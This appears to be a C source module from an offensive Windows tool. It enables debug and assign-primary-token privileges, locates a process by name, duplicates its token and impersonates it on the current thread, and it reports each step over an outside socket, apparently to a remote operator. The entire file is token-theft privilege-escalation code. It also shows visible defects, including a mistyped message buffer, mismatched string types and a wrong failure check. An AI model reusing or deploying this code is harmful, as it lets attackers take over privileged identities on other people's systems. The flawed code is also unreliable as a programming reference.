#pragma once

#include "impersonate.h"

extern SOCKET winSock;
CHAR* global_cur_msg[0x200] = { 0 };

#define LOG_SOCK(x, ...) \
	sprintf(global_cur_msg, x, __VA_ARGS__); \
	send(winSock, global_cur_msg, strlen(global_cur_msg), 0);

BOOL EnablePrivilege(LPWSTR Privilege)
{
	LUID luid = { 0 };
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hToken;

	if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
		LOG_SOCK("%s:%d: Failed to open process token\n", __FUNCTION__, __LINE__);
		return FALSE;
	}

    if (!LookupPrivilegeValue(NULL, Privilege, &luid)) {
		LOG_SOCK("%s:%d: Failed to lookup privilege value\n", __FUNCTION__, __LINE__);
		return FALSE;
	}

    // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege.
    LUID_AND_ATTRIBUTES luAttr = { .Luid = luid, .Attributes = SE_PRIVILEGE_ENABLED };
    // Now we create a TOKEN_PRIVILEGES structure with our modifications
	TOKEN_PRIVILEGES tp = { .PrivilegeCount = 1, .Privileges = {0} };
    tp.Privileges[0] = luAttr;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
		LOG_SOCK("%s:%d: Failed to adjust privs\n", __FUNCTION__, __LINE__);
		return FALSE;
	}

    BOOL ret;
    PRIVILEGE_SET privs = { .Privilege = {0}, .Control = PRIVILEGE_SET_ALL_NECESSARY, .PrivilegeCount = 1 };
    privs.Privilege[0].Luid = luid;
    privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!PrivilegeCheck(hToken, &privs, &ret)) {
        LOG_SOCK("%s:%d: Failed privilege check\n", __FUNCTION__, __LINE__);
        return FALSE;
    }

    return TRUE;
}

BOOL ImpersonateProcessToken(int pid)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (hProcess == INVALID_HANDLE_VALUE) {
		LOG_SOCK("%s:%d: Failed to open process\n", __FUNCTION__, __LINE__);
		return FALSE;
	}

	HANDLE hToken = INVALID_HANDLE_VALUE;
	if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
		LOG_SOCK("%s:%d: Failed to open process token\n", __FUNCTION__, __LINE__);
		return FALSE;
	}

    HANDLE DuplicatedToken = INVALID_HANDLE_VALUE;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &DuplicatedToken)) {
		LOG_SOCK("%s:%d: Failed to duplicate token\n", __FUNCTION__, __LINE__);
		return FALSE;
	}
	if (!SetThreadToken(NULL, DuplicatedToken)) {
		LOG_SOCK("%s:%d: Failed to set thread token\n", __FUNCTION__, __LINE__);
		return FALSE;
	}
    return TRUE;
}

BOOL ProcessGetPIDFromName(LPCSTR pszProcessName, PDWORD pdwProcessId)
{
    HANDLE target_process = INVALID_HANDLE_VALUE;
	*pdwProcessId = -1;

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    LOG_SOCK("Enumerating processes\n");


    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        LOG_SOCK("EnumProcessesFailed\n");
        return FALSE;
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.

    for (i = 0; i < cProcesses; i++)
    {
        DWORD pid = aProcesses[i];
        if (pid != 0)
        {
            CHAR szProcessName[MAX_PATH] = "<unknown>";

            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,
                FALSE, pid);

            if (NULL != hProcess)
            {
                HMODULE hMod;
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
                    &cbNeeded))
                {
                    GetModuleBaseNameA(hProcess, hMod, szProcessName,
                        sizeof(szProcessName) / sizeof(CHAR));
                }

                LOG_SOCK("Process: %s\n", szProcessName);

                if (stricmp(szProcessName, pszProcessName) == 0) {
                    LOG_SOCK("Found %s\n", pszProcessName);

                    target_process = hProcess;
					*pdwProcessId = pid;

                    break;
                }

                CloseHandle(hProcess);
            }
        }
    }

	if (*pdwProcessId != -1)
		return TRUE;

	return FALSE;
}

BOOL ImpersonateProcess(LPWSTR processName) {
	int pid = 0;
	BOOL ret = ProcessGetPIDFromName(processName, &pid);
	if (!ret) {
		LOG_SOCK("Failed to get process pid\n");
		return FALSE;
	}

	ret = EnablePrivilege(SE_DEBUG_NAME);
    if (!ret) {
        LOG_SOCK("%s:%d: Failed to enable priv: DEBUG\n", __FUNCTION__, __LINE__);
        return FALSE;
    }
	
	ret = EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    if (!ret) {
        LOG_SOCK("%s:%d: Failed to enable priv: ASSIGN PRIMARY TOKEN\n", __FUNCTION__, __LINE__);
        return FALSE;
    }

	LOG_SOCK("%s:%d: Trying to impersonate pid: %d\n", __FUNCTION__, __LINE__, pid);
	return ImpersonateProcessToken(pid);
}

BOOL RevertImpersonation() {
	return RevertToSelf();
}